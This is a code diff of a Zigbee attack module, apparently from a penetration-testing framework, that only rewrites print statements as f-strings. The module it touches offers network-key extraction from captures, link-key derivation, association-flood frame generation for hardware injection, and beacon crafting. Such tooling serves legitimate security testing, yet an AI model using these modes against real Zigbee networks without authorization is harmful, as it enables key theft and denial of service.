@@ -298,11 +298,11 @@ class Exploit(Exploit):
             print_error("pcap_file is required.")
             return
 
-        print_status("Analyzing Zigbee PCAP: {}".format(self.pcap_file))
+        print_status(f"Analyzing Zigbee PCAP: {self.pcap_file}")
         try:
             packets = rdpcap(self.pcap_file)
         except Exception as err:
-            print_error("Failed to read PCAP: {}".format(err))
+            print_error(f"Failed to read PCAP: {err}")
             return
 
         networks: Dict[int, Dict] = {}
@@ -334,17 +334,17 @@ class Exploit(Exploit):
                         networks[pan]["addresses"].add(str(parsed[key]))
 
         print_success("Zigbee PCAP analysis:")
-        print_info("  Total frames: {}".format(total_frames))
-        print_info("  Encrypted:    {}".format(encrypted_count))
-        print_info("  Networks:     {}".format(len(networks)))
+        print_info(f"  Total frames: {total_frames}")
+        print_info(f"  Encrypted:    {encrypted_count}")
+        print_info(f"  Networks:     {len(networks)}")
 
         for pan_id, info in networks.items():
-            print_info("\n  PAN 0x{:04X}:".format(pan_id))
+            print_info(f"\n  PAN 0x{pan_id:04X}:")
             print_info("    Frames: {} ({} encrypted)".format(
                 info["frames"], info["encrypted"]))
             print_info("    Devices: {}".format(len(info["addresses"])))
             for addr in sorted(info["addresses"])[:10]:
-                print_info("      - {}".format(addr))
+                print_info(f"      - {addr}")
 
     def _extract_key(self) -> None:
         """Extract plaintext network key from PCAP."""
@@ -357,7 +357,7 @@ class Exploit(Exploit):
 
         key = extract_network_key(raw_packets)
         if key:
-            print_success("Network key found: {}".format(key.hex()))
+            print_success(f"Network key found: {key.hex()}")
         else:
             print_info("No plaintext network key found in PCAP.")
             print_info("Key may be encrypted. Try sniffing during key transport.")
@@ -385,13 +385,12 @@ class Exploit(Exploit):
             expected_crc = crc_ccitt_kermit(crc_data)
             actual_crc = struct.unpack("<H", code_bytes[-2:])[0]
             if expected_crc != actual_crc:
-                print_info("CRC mismatch: expected 0x{:04X}, got 0x{:04X}".format(
-                    expected_crc, actual_crc))
+                print_info(f"CRC mismatch: expected 0x{expected_crc:04X}, got 0x{actual_crc:04X}")
 
         link_key = derive_link_key_from_install_code(code_bytes)
         print_success("Link key derived from install code:")
-        print_info("  Install code: {}".format(code_bytes.hex()))
-        print_info("  Link key:     {}".format(link_key.hex()))
+        print_info(f"  Install code: {code_bytes.hex()}")
+        print_info(f"  Link key:     {link_key.hex()}")
 
     def _generate_assoc_flood(self) -> None:
         """Generate association flood frames for offline preparation."""
@@ -399,8 +398,7 @@ class Exploit(Exploit):
             print_error("target_pan is required.")
             return
 
-        print_status("Generating {} association request frames for PAN 0x{:04X}...".format(
-            self.flood_count, self.target_pan))
+        print_status(f"Generating {self.flood_count} association request frames for PAN 0x{self.target_pan:04X}...")
 
         frames = []
         for i in range(self.flood_count):
@@ -410,8 +408,7 @@ class Exploit(Exploit):
             )
             frames.append(frame)
 
-        print_success("Generated {} frames. Save to PCAP for hardware injection.".format(
-            len(frames)))
+        print_success(f"Generated {len(frames)} frames. Save to PCAP for hardware injection.")
         print_info("Use KillerBee hardware (ApiMote/CC2531) for actual injection.")
 
 
@@ -434,9 +431,9 @@ class Exploit(Exploit):
         """Execute Zigbee attack module."""
         if self.dry_run:
             print_info("Zigbee Attack Configuration:")
-            print_info("  Mode:     {}".format(self.attack))
-            print_info("  PCAP:     {}".format(self.pcap_file))
-            print_info("  Pan ID:   0x{:04X}".format(self.target_pan))
+            print_info(f"  Mode:     {self.attack}")
+            print_info(f"  PCAP:     {self.pcap_file}")
+            print_info(f"  Pan ID:   0x{self.target_pan:04X}")
             return
 
         modes = {
@@ -444,8 +441,7 @@ class Exploit(Exploit):
             "key_extract": self._extract_key,
             "key_derive": self._derive_key,
             "assoc_flood_gen": self._generate_assoc_flood,
-            "beacon_craft": lambda: print_info("Beacon: {}".format(
-                build_beacon_request().hex())),
+            "beacon_craft": lambda: print_info(f"Beacon: {build_beacon_request().hex()}"),
         }
 
         handler = modes.get(self.attack)
